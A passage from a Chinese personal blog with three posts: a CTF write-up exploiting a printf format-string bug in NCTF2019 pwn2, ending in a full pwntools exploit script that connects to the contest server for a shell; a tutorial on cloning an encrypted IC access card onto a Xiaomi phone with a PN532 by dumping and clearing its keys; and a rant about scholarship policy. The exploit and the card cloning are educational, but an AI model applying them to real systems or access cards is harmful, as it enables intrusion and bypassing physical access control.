<td align="center"><code>double</code>值，输出形式为10进制的([<code>-</code>]d.ddd <code>e</code>[<code>+</code>/<code>-</code>]ddd). <code>E</code>版本使用的指数符号为<code>E</code>（而不是<code>e</code>）。指数部分至少包含2位数字，如果值为0，则指数部分为<code>00</code>。Windows系统，指数部分至少为3位数字，例如<code>1.5e002</code>，也可用Microsoft版的运行时函数<code>_set_output_format</code> 修改。小数点前存在1位数字。小数点后的数字位数等于精度。精度默认为6。如果精度为0且没有#标记，则不出现小数点。</td>
</tr>
<tr>
<td align="center"><code>g</code>, <code>G</code></td>
<td align="center"><code>double</code>型数值，精度定义为全部有效数字位数。当指数部分在<a href="https://zh.wikipedia.org/wiki/闭区间" target="_blank" rel="noopener">闭区间</a> [-4,5] 内，输出为定点形式；否则输出为指数浮点形式。’<code>g</code>‘使用小写字母，’<code>G</code>‘使用大写字母。小数点右侧的尾数0不被显示；显示小数点仅当输出的小数部分不为0。</td>
</tr>
<tr>
<td align="center"><code>x</code>, <code>X</code></td>
<td align="center">16进制<code>unsigned int</code>。’<code>x</code>‘使用小写字母；’<code>X</code>‘使用大写字母。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td>
</tr>
<tr>
<td align="center"><code>o</code></td>
<td align="center">8进制<code>unsigned int</code>。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td>
</tr>
<tr>
<td align="center"><code>s</code></td>
<td align="center">如果没有用l标志，输出<a href="https://zh.wikipedia.org/w/index.php?title=Null结尾字符串&action=edit&redlink=1" target="_blank" rel="noopener">null结尾字符串</a>直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了l标志，则对应函数参数指向wchar_t型的数组，输出时把每个宽字符转化为多字节字符，相当于调用<code>wcrtomb</code>函数。</td>
</tr>
<tr>
<td align="center"><code>c</code></td>
<td align="center">如果没有用l标志，把int参数转为<code>unsigned char</code>型输出；如果用了l标志，把wint_t参数转为包含两个元素的<code>wchart_t</code>数组，其中第一个元素包含要输出的字符，第二个元素为null宽字符。</td>
</tr>
<tr>
<td align="center"><code>p</code></td>
<td align="center"><code>void *</code>型</td>
</tr>
<tr>
<td align="center"><code>a</code>, <code>A</code></td>
<td align="center"><code>double</code>型的16进制表示，”[−]0<strong>x</strong>h.hhhh <strong>p</strong>±d”。其中指数部分为10进制表示的形式。例如：1025.010输出为0x1.004000p+10。’<code>a</code>‘使用小写字母，’<code>A</code>‘使用大写字母。<a href="https://zh.wikipedia.org/wiki/格式化字符串#cite_note-2" target="_blank" rel="noopener">[2]</a><a href="https://zh.wikipedia.org/wiki/格式化字符串#cite_note-3" target="_blank" rel="noopener">[3]</a> （C++11流使用<code>hexfloat</code>输出16进制浮点数）</td>
</tr>
<tr>
<td align="center"><code>n</code></td>
<td align="center">不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</td>
</tr>
<tr>
<td align="center"><code>%</code></td>
<td align="center">‘<code>%</code>‘字面值，不接受任何flags, width, precision or length。</td>
</tr>
</tbody></table>
<p>​    注意 <strong>n</strong> 这个type，它不会向屏幕中输出数据，而是会在参数所对应的地址上写上上一次 printf 输出的字节数， 配合 <strong>%100c%n</strong> 类型的格式化字符串使用更佳。</p>
<p>​    此处 <strong>100c</strong> 指的是填充输出100个字符，%n 指的是在相应的内存上写上<strong>100这个数据</strong></p>
<h2 id="一个例子"><a href="#一个例子" class="headerlink" title="一个例子"></a>一个例子</h2><p>@NCTF2019 pwn2</p>
<p> <a href="\uploads\nctf2019_pwn2.7z">nctf2019_pwn2.7z</a> </p>
<h3 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h3><p>让我们来总览一下程序</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ubuntu:~/Desktop/<span class="built_in">test</span><span class="comment"># checksec pwn_me_2 </span></span><br><span class="line">[*] <span class="string">'/home/mrh929/Desktop/test/pwn_me_2'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<p>保护全开，尤其是地址随机化，让我们不能定位到代码段的具体位置</p>
<h3 id="泄漏点分析"><a href="#泄漏点分析" class="headerlink" title="泄漏点分析"></a>泄漏点分析</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  initialize();</span><br><span class="line">  input_name();</span><br><span class="line">  memcpy_and_printf();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"pwn me 100 years again,please!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"are you ready?"</span>);</span><br><span class="line">  read_and_printf();</span><br><span class="line">  <span class="keyword">if</span> ( dword_55BA09B090E0 != <span class="number">0x66666666</span> )</span><br><span class="line">    failed();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"enjoy the fun of pwn"</span>);</span><br><span class="line">  getshell();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主要关注和read与printf有关的函数。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">input_name</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"welcome to play nctf!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"a little different,have fun."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"but your name:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">sub_55BA09907C54</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">strncpy</span>(&amp;dest, src, <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;dest, src);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序要求我们输入姓名，然后将 src 处的字符串复制到 dest ，并且输出 dest</p>
<p>但是经过调试，会发现后面这个函数不仅仅输出了那10个字符，而是在其后输出了乱码。</p>
<p>这个乱码也就是溢出点，是程序栈中的数据。</p>
<p>注意到 input_name 函数中存在read函数，这个函数仅仅进行了读入操作而并没有任何输出行为。</p>
<p>还是得经过一番调试，我们才会发现，<strong>buf 处的内存与后文的 dest 内存有一部分重叠，而 dest 的数据又没有进行初始化，导致我们可以直接访问前一个函数所注入的数据</strong></p>
<blockquote>
<p>尝试找出溢出点</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[1] Accepting connection from 192.168.244.1...</span><br><span class="line">welcome to play nctf!</span><br><span class="line">a little different,have fun.</span><br><span class="line">but your name:</span><br><span class="line">11112222333344445555</span><br></pre></td></tr></table></figure>

<p>程序下断点在 <strong>printf</strong> 函数内，IDA 栈检测窗口中：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">00007FFFA44EFD08  000055A46A191C94  memcpy_and_printf+40</span><br><span class="line">00007FFFA44EFD10  6E69726170657270  </span><br><span class="line">00007FFFA44EFD18  0A2E2E2E2E2E2E67  </span><br><span class="line">00007FFFA44EFD20  00007F0A35353535  </span><br><span class="line">00007FFFA44EFD28  00007F9077AE8DBD  libc_2.23.so:_IO_setbuffer+BD</span><br><span class="line">00007FFFA44EFD30  00007F9077E3E620  libc_2.23.so:_IO_2_1_stdout_</span><br><span class="line">00007FFFA44EFD38  00007F9077AE681F  libc_2.23.so:_IO_fflush+7F</span><br><span class="line">00007FFFA44EFD40  0000000000000000  </span><br><span class="line">00007FFFA44EFD48  3B62E912D2F58C00  </span><br><span class="line">00007FFFA44EFD50  00007FFFA44EFD60  [stack]:00007FFFA44EFD60</span><br><span class="line">00007FFFA44EFD58  000055A46A191CCD  main+22</span><br><span class="line">00007FFFA44EFD60  000055A46A191D30  init</span><br><span class="line">00007FFFA44EFD68  00007F9077A99830  libc_2.23.so:__libc_start_main+F0</span><br></pre></td></tr></table></figure>

<p>注意 <strong>00007FFFA44EFD20</strong> ，这个地址保存了我们刚刚输入的数据的后半段：00 00 7F 0A 35 35 35 35</p>
<p>可以发现，这个数据之前的就是 src 本身的数据，而这个地方就是上一个 <strong>input_name</strong> 函数所带来的数据</p>
<p>偏移为 4 * 4 = <strong>16</strong></p>
<p>搜查系统栈，我们发现了一个可以利用的数据</p>
<blockquote>
<p>00007FFFA44EFD50  00007FFFA44EFD60  [stack]:00007FFFA44EFD60</p>
</blockquote>
<p>这是一个指向栈中的指针，我们可以通过格式化字符串将其所指向的地址泄露</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">16</span> + <span class="string">"%14$lld"</span> </span><br><span class="line"><span class="comment">#注意这是64位程序，函数指针长达8个字节，必须通过%lld泄露</span></span><br><span class="line"><span class="comment">#前16个字节会被src覆盖，问题不大</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">'..\n'</span>)</span><br><span class="line"></span><br><span class="line">stack_addr = int(p.recv(<span class="number">15</span>))</span><br></pre></td></tr></table></figure>

<p>为什么要泄露这个栈中的地址呢？是因为我们发现通过这几个有限的泄露点是不能进行栈溢出的，因为 canary 和动态地址两者 <strong>只能知道其一</strong> 。</p>
<p>只有通过格式化字符串的方式在第二个泄漏点改变栈中的函数返回地址，从而让程序直接跳过检验内存数据是否为 0x66666666 的过程。</p>
<p>继续调试，下断点在下一个 printf 函数  ，查看系统栈</p>
<p><strong>由于不方便调试，我调试了多次，动态地址有所变化，不过不影响观察</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">00007FFD56761AB8  000055607F0F1C31  read_and_printf+5B</span><br><span class="line">00007FFD56761AC0  000A303030303030  </span><br><span class="line">00007FFD56761AC8  00007FA8E673781B  libc_2.23.so:_IO_file_overflow+EB</span><br><span class="line">00007FFD56761AD0  000000000000000E  </span><br><span class="line">00007FFD56761AD8  00007FA8E6A82620  libc_2.23.so:_IO_2_1_stdout_</span><br><span class="line">00007FFD56761AE0  000055607F0F1E7F  .rodata:aAreYouReady</span><br><span class="line">00007FFD56761AE8  00007FA8E672C7FA  libc_2.23.so:puts+16A</span><br><span class="line">00007FFD56761AF0  0000000000000000  </span><br><span class="line">00007FFD56761AF8  C275F8AAB68E9400  </span><br><span class="line">00007FFD56761B00  00007FFD56761B10  [stack]:00007FFD56761B10</span><br><span class="line">00007FFD56761B08  000055607F0F1CEF  main+44</span><br><span class="line">00007FFD56761B10  000055607F0F1D30  init</span><br><span class="line">00007FFD56761B18  00007FA8E66DD830  libc_2.23.so:__libc_start_main+F0</span><br></pre></td></tr></table></figure>

<p>第二行 *<em>00007FFD56761AC0 *</em> 00 0A 30 30 30 30 30 30 是我输入的数据，直接出现在栈里面了，可以直接通过格式化字符串作为修改内存的一个参数</p>
<p>倒数第二行 <strong>00007FFD56761B08</strong>  main+44 这个地方是函数的返回地址，我们需要知道，<strong>PIE功能</strong>虽然会改变程序的基地址，但是通常它的最后两个字节也就是<strong>12位地址是不会发生改变的</strong>，利用这一点我们就不用去修改太多数据，最后两个字节即可。</p>
<p>再进行观察，算出这个地址与之前泄露的栈地址的偏移 为 <strong>-8</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:000055607F0F1CD4                 call    _puts</span><br><span class="line">.text:000055607F0F1CD9                 lea     rdi, aAreYouReady ; &quot;are you ready?&quot;</span><br><span class="line">.text:000055607F0F1CE0                 call    _puts</span><br><span class="line">.text:000055607F0F1CE5                 mov     eax, 0</span><br><span class="line">.text:000055607F0F1CEA                 call    read_and_printf</span><br><span class="line">.text:000055607F0F1CEF                 mov     eax, cs:dword_55607F2F30E0</span><br><span class="line">.text:000055607F0F1CF5                 cmp     eax, 66666666h</span><br><span class="line">.text:000055607F0F1CFA                 jnz     short loc_55607F0F1D14</span><br></pre></td></tr></table></figure>

<p>查看汇编，发现 0xef 和 0xfa 地址刚好只相差一个字节，可以直接跳过检验数据的过程</p>
<p>我们便能写出 payload2</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">stack_addr -= <span class="number">8</span></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">"%250d%8$hhn"</span> + <span class="string">'k'</span>*<span class="number">5</span> + p64(stack_addr)</span><br><span class="line">p.sendline(payload2)</span><br></pre></td></tr></table></figure>

<p>%250d 是为了填充250个字节</p>
<p>hh 是选择好的格式，代表以字节写入</p>
<p>与此类似的还有 </p>
<ol>
<li><p><strong>h</strong> : 按双字节写入  </p>
</li>
<li><p><strong>l</strong> : 按四字节写入</p>
</li>
<li><p><strong>ll</strong>：按八字节写入</p>
</li>
</ol>
<p>n 代表将前一个格式化字符串所输出的字节数量存入对应的地址中</p>
<p>补充5个padding的目的是对齐栈，使注入的数据位置正确。</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><blockquote>
<p>完整 exp</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"DEBUG"</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'139.129.76.65'</span>,<span class="number">50005</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./pwn_me_2')</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">16</span> + <span class="string">"%14$lld"</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">'..\n'</span>)</span><br><span class="line"></span><br><span class="line">stack_addr = int(p.recv(<span class="number">15</span>))</span><br><span class="line">success(hex(stack_addr))</span><br><span class="line"><span class="comment"># 0x7ffd3ff3e9c0, the addr of stack</span></span><br><span class="line"></span><br><span class="line">stack_addr -= <span class="number">8</span></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">"%250d%8$hhn"</span> + <span class="string">'k'</span>*<span class="number">5</span> + p64(stack_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
    <link itemprop="mainEntityOfPage" href="https://mrh1s.top/posts/2b135c76/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="mrh929">
      <meta itemprop="description" content="Blog">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="mrh929's home">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/posts/2b135c76/" class="post-title-link" itemprop="url">利用pn532使小米手机模拟加密门卡</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2019-10-31 22:49:16" itemprop="dateCreated datePublished" datetime="2019-10-31T22:49:16+08:00">2019-10-31</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-01-14 16:12:55" itemprop="dateModified" datetime="2020-01-14T16:12:55+08:00">2020-01-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tips/" itemprop="url" rel="index">
                    <span itemprop="name">Tips</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <blockquote>
<p><strong>声明</strong> ：本教程仅供学习交流之用途，本教程不能增加你的饭卡余额，亦不能使你越过他人的门禁系统，仅仅作讨论NFC技术所使用，不得将技术用于非法途径，违法者必将受到处罚！</p>
</blockquote>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="门卡的分类"><a href="#门卡的分类" class="headerlink" title="门卡的分类"></a>门卡的分类</h3><p>如今市面上的卡多分为两种，一种是 <strong>ID Card</strong> ， 一种是 <strong>IC Card</strong> 。</p>
<p><strong>ID Card</strong> (Identification Card) ，全称身份识别卡，工作频率为 125KHZ。其中能储存的信息只有出厂时自带的 ID卡号，一经出厂，不可修改。由于频段不一样，小米手机无法模拟。</p>
<p><strong>IC Card</strong> (Integrated Circuit Card)，全称集成电路卡，工作频率 13.56MHz。</p>
<p>其中拥有 <strong>16个扇区</strong> ，每个扇区拥有 <strong>两个密钥</strong> ，这种类型的卡是小米手机可以模拟的，但能否成功模拟还需要一些运气。（根据机器的好坏，卡片破解的成功率也会有所不同）</p>
<h3 id="门卡区分"><a href="#门卡区分" class="headerlink" title="门卡区分"></a>门卡区分</h3><h4 id="ID卡与IC卡"><a href="#ID卡与IC卡" class="headerlink" title="ID卡与IC卡"></a>ID卡与IC卡</h4><p><img src="https://i.loli.net/2019/10/31/Qjfb49knhDBv1Se.jpg" alt="distinguish"></p>
<h4 id="UID-CUID-FUID-UFUID-卡"><a href="#UID-CUID-FUID-UFUID-卡" class="headerlink" title="UID CUID FUID UFUID 卡"></a>UID CUID FUID UFUID 卡</h4><h5 id="UID-卡"><a href="#UID-卡" class="headerlink" title="UID 卡"></a>UID 卡</h5><p>普通复制卡，可以重复擦写所有扇区，主要应用在IC卡复制上，遇到带有防火墙的读卡器就会失效。</p>
<h5 id="CUID-卡"><a href="#CUID-卡" class="headerlink" title="CUID 卡"></a>CUID 卡</h5><p>可擦写防屏蔽卡，可以重复擦写所有扇区，UID卡复制无效的情况下使用，可以绕过防火墙，但对于有些防火墙无效，需用到FUID卡。</p>
<h5 id="FUID-卡"><a href="#FUID-卡" class="headerlink" title="FUID 卡"></a>FUID 卡</h5><p>不可擦写防屏蔽卡，此卡的特点0扇区只能写入一次，写入一次变成 M1 卡，CUID 复制没用的情况下使用，可以绕过防火墙。</p>
<h5 id="UFUID-卡"><a href="#UFUID-卡" class="headerlink" title="UFUID 卡"></a>UFUID 卡</h5><p>高级复制卡，我们就理解为是 UID 和 FUID 的合成卡，需要封卡操作，不封卡就是 UID 卡，封卡后就变为 M1 卡。</p>
<h3 id="小米手机模拟门卡的原理"><a href="#小米手机模拟门卡的原理" class="headerlink" title="小米手机模拟门卡的原理"></a>小米手机模拟门卡的原理</h3><p>小米手机模拟门卡有两种方式：</p>
<ol>
<li><p><strong>开空白卡片</strong>.</p>
<p>​    通过选择 “自定义空白卡”， 并且进行身份认证，可以为手机开通一张空白的卡片，再将卡贴进发卡机器，即可获得一张全新卡片。</p>
<p>​    这个方法有一个很明显的弊端，就是 卡片 uid <strong>无法模拟</strong>，当遇到根据 uid 识别身份的场景，这种方法就不凑效了。</p>
<blockquote>
<p> 这是一种最直接通过物管获取卡片的方式，如果物管好说话可以直接找他们帮助发卡。</p>
</blockquote>
</li>
<li><p><strong>复制非加密卡</strong></p>
<p>​    小米手机会自动识别卡片类型，如果卡片的所有扇区均未加密，即可进行复制并且完全模拟。</p>
<p>优势很明显： 可以 <strong>完全复制</strong> 包括 uid 在内的所有卡片信息（厂商信息除外）</p>
<p>缺点：只能复制非加密卡</p>
</li>
</ol>
<p>   ​    似乎只有非加密卡才能被复制 uid ，难道加密卡只能复制除了0扇区之外的信息了吗？</p>
<p>   <strong>答案当然不是这样的！</strong></p>
<p>   我们可以通过 <strong>伪造非加密卡</strong> 来达到复制uid的效果！</p>
<p>   因为卡片的任意数据都是可以被自由修改的，我们可以将卡片的密钥清除，将其伪装成一张 <strong>非加密卡</strong> 写入小米手机后，再用设备将密钥写回去。</p>
<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><h3 id="准备原料"><a href="#准备原料" class="headerlink" title="准备原料"></a>准备原料</h3><ol>
<li><p>带NFC功能的小米手机/手环</p>
</li>
<li><p><strong>PN532</strong> 一台（其他读卡器也可）</p>
<blockquote>
<p>首先确认一下线序，<strong>插错必烧</strong>！</p>
</blockquote>
<p><img src="https://i.loli.net/2019/11/01/ODMvP2WXskCU4AE.jpg" alt="QQ图片20191101120958_cr.jpg"></p>
</li>
</ol>
<ol start="3">
<li><p>空白 <strong>cuid卡</strong> 一张</p>
<h3 id="读取原卡"><a href="#读取原卡" class="headerlink" title="读取原卡"></a>读取原卡</h3><p>打开上位机，读取原卡内容。</p>
<p>（涉及到破解密钥的过程，时间会有点长，但只要能解析出原信息，那么都是可以模拟的）</p>
<blockquote>
<p>我们可以看到卡片的大致结构</p>
</blockquote>
<p><img src="https://i.loli.net/2019/11/01/odsBZbEF7Omh26T.png" alt="QQ图片20191101114910.png"></p>
<p>0扇区的第0块主要存储卡的基本信息，包括 <strong>UID</strong> 以及 <strong>厂商信息</strong></p>
<p>第3块的前6个字节存储该扇区的 <strong>keyA</strong>，中间4个字节是访问控制码 ，后6个字节存储 <strong>keyB</strong>。</p>
<p>由于这是一张加密卡，所以我们得把数据 <strong>dump</strong> 下来，并且将数据通过非加密卡传入手机中</p>
<h3 id="dump-并-修改数据"><a href="#dump-并-修改数据" class="headerlink" title="dump 并 修改数据"></a>dump 并 修改数据</h3><p>点击上位机左上角的三角形图标，dump数据</p>
<p><img src="https://i.loli.net/2019/11/01/4pBCRYbsa3UDqJG.png" alt="QQ图片20191101114910.png"></p>
</li>
</ol>
<p>然后可以把这个数据先备份下来，为后面给手机写入 <strong>原卡数据</strong> 做准备</p>
<p>用 <strong>010editor</strong> 打开dump后的数据</p>
<p>我们需要把加密卡转换成非加密卡，只需要把 <strong>keyA keyB</strong> 写为 <strong>FFFFFFFFFFFF</strong> 即可（相当于无密钥）</p>
<p><img src="https://i.loli.net/2019/11/01/vBpSiFHx8Kutcj7.png" alt="QQ图片20191101114910.png"></p>
<blockquote>
<p>可以用替换命令一键替换</p>
</blockquote>
<p>其他东西不用管，只需要确保密钥被清除即可，然后保存</p>
<h3 id="写入白卡"><a href="#写入白卡" class="headerlink" title="写入白卡"></a>写入白卡</h3><p>一键写入，不需赘述。</p>
<p><img src="https://i.loli.net/2019/11/01/o2XsDmAqkhv16Ln.png" alt="QQ图片20191101114910.png"></p>
<p>写卡完成之后再读取一遍，确认我们已经成功抹掉密钥</p>
<p><img src="https://i.loli.net/2019/11/01/IwM5lm7HLdjJ9aG.png" alt="QQ图片20191101114910.png"></p>
<p>密钥已经成功清除</p>
<h3 id="手机复制白卡"><a href="#手机复制白卡" class="headerlink" title="手机复制白卡"></a>手机复制白卡</h3><p>按照复制白卡的方式创建门卡</p>
<p><img src="https://i.loli.net/2019/11/01/VePRaWEkXY7UC31.jpg" alt="QQ图片20191101120958_cr.jpg"></p>
<p>​        进行身份验证之后，将白卡贴至手机即可复制成功。</p>
<h3 id="用pn532覆写密钥"><a href="#用pn532覆写密钥" class="headerlink" title="用pn532覆写密钥"></a>用pn532覆写密钥</h3><p>现在我们手中的模拟门卡只具有 <strong>存储的信息</strong>，并未储存机器中 <strong>匹配的密钥</strong>。</p>
<p>最后一步是要将原卡的加密密钥一并复制到手机模拟卡当中。</p>
<p>如果在前一步没有备份好原卡的信息的话，还需要重新读卡一次并dump数据</p>
<p>已经备份好了可以直接进行下一步</p>
<p>这一步直接双击手机的电源键，唤起手机 <strong>NFC卡片</strong></p>
<p>将手机靠近pn532，读取卡片，并且写入 <strong>原卡数据</strong> 即可</p>
<p>（注意，不是那个伪造的非加密卡的数据，而是原卡数据）</p>
<p><img src="https://i.loli.net/2019/11/01/o2XsDmAqkhv16Ln.png" alt="QQ图片20191101114910.png"></p>
<p>为了确保写入成功，我们重新读取一次手机NFC数据：</p>
<p><img src="https://i.loli.net/2019/11/01/xe9GiIuFcytdzvW.png" alt="QQ图片20191101160656.png"></p>
<p>看到N9~N15： 厂商信息。已经和原卡完全不同了！这里是我之前在基础知识里面所说的，由于小米官方的原因，厂商信息是<strong>无法修改</strong>的，会原封不动地保留下来，而其他信息和原卡<strong>完全一致</strong>！</p>
<p><strong>至此，我们利用pn532来复制卡片便成功了！</strong></p>
<blockquote>
<p><strong>声明</strong> ：本教程仅供学习交流之用途，本教程不能增加你的饭卡余额，亦不能使你越过他人的门禁系统，仅仅作讨论NFC技术所使用，不得将技术用于非法途径，违法者必将受到处罚！</p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
    <link itemprop="mainEntityOfPage" href="https://mrh1s.top/posts/1e65a7e/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="mrh929">
      <meta itemprop="description" content="Blog">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="mrh929's home">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/posts/1e65a7e/" class="post-title-link" itemprop="url">说说学校奖学金的事</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2019-09-21 01:37:23 / Modified: 01:43:59" itemprop="dateCreated datePublished" datetime="2019-09-21T01:37:23+08:00">2019-09-21</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/牢骚/" itemprop="url" rel="index">
                    <span itemprop="name">牢骚</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​    在你电奖学金想要加个分就这么难吗?</p>
<p>​        辛辛苦苦一年打了十多场比赛，好不容易得了几个奖状，拿到辅导员面前一问，她便以”这个比赛我们软件学院的老师没听说过”为由就将我所有的努力全部都否定了?<br>好声好气地慢慢解释，她还反问我:”你是在那个地方找的比赛哦，是不是<strong>在百度找的哦?</strong>我们的奖学金认定<strong>很谨慎</strong>的，<strong>很多比赛都很水的</strong>“
​        堂堂一个辅导员，不为了学生的健康发展而做出努力，却阴阳怪气地去质疑一个学生，去干涉那些和她利益毫不相关的奖学金，为的是什么?何况奖学金细则可<strong>从来没有写我必须参加哪种类型的比赛</strong>啊?什么自由参加比赛，“只要有证明即可加分”这些承诺都是假的。为何纸上一套，嘴上一套呢?<br>​        最水的比赛会花上两天两夜在电脑面前肝题，最水的比赛会让全国上百所高校的学生争相参加，国家高度重视吗?<br>​        辅导员想让你做的，只是按照他们设计的路线，走好所谓的”成功之路”，参加他们的比赛，特别是那些对于自己能力提升毫无意义的，却能<strong>给学院带来巨大声望</strong>的比赛，这才是水赛啊，呵呵，<strong>我 骂 我 自 己</strong>  。对于那些真正有意义的比赛，他们不care，心情好会给你一个奖励，心情不好则给你安上骗学分、骗奖学金的标签。<br>​        学生工作，辅导员助理，这些工作算不上轻松，但绝谈不上肝。我们电子科大的学生拼死拼活忙一年，即使发表一篇sci论文所得的分还没一个学生会干事来的多，而且当学生干事，奖学金认定轻轻松松，为学校做事就是好啊。为你做了事，当然应当奖励。而到了你利益的盲区，就各种克扣学生、为难学生，当上了正义的使者。<br>​        我从来没有否定过学生活动的重要性，何况我自己就是班委制度的受益者，学生工作有多累我也是明白的，他们应当拿到这份奖励。我只希望辅导员的嘴脸不要摆的那么明显，单纯为利益所驱动，打着为了学生好的旗帜来做双标、利己的勾当。<br>​        所谓那啥: 我还是不所谓了。就这样吧。<br>​        